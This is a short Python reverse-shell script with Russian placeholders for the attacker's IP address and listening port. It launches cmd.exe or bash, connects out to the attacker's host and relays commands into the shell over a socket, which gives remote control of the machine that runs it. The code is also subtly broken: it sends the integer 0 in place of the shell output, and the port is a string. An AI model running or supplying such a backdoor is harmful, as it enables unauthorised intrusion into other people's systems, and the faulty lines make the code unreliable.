import socket
import os
import threading
import subprocess as sp
import platform

ip_addr = 'Введите свой IP адрес'
port = 'Введи порт с которого будете слушать'

if platform.system() == 'Windows':
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
else:
    p = sp.Popen(['/bin/bash'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)


s = socket.socket()
s.connect((ip_addr,port))

def read_and_send():
    while True:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(0)
        
def recv_and_write():
    while True:
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)
        
threading.Thread(target=read_and_send, daemon= True).start()
threading.Thread(target=recv_and_write).start()        
